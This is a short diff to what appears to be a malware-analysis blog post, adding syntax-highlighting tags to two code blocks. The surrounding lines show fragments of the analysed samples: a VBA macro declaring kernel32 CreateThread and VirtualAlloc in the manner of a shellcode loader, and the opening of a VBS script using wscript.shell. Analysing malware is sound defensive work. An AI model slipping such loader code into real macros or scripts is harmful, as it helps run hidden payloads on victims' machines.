@@ -32,7 +32,7 @@ We can interrogate this macro by using OLE tools to view it.
 
 ![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/66db0700-4e12-4eba-94e4-6621bb1b38d7)
 
-```
+```vba
 Attribute VB_Name = "Module1"
 Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal six As Long, ByVal five As Long, ByVal four As LongPtr, three As Long, ByVal two As Long, one As Long) As LongPtr
 Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal seven As Long, ByVal eight As Long, ByVal nine As Long, ByVal ten As Long) As LongPtr
@@ -220,7 +220,7 @@ There is also the capability for replication across removable media drives, and 
 ![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/b47f825d-f9e8-4a07-b3be-14859f79be54)
 
 **VBS Script**
-```
+```vbs
 dim shellobj
 set shellobj = wscript.createobject("http://wscript.shell")
 
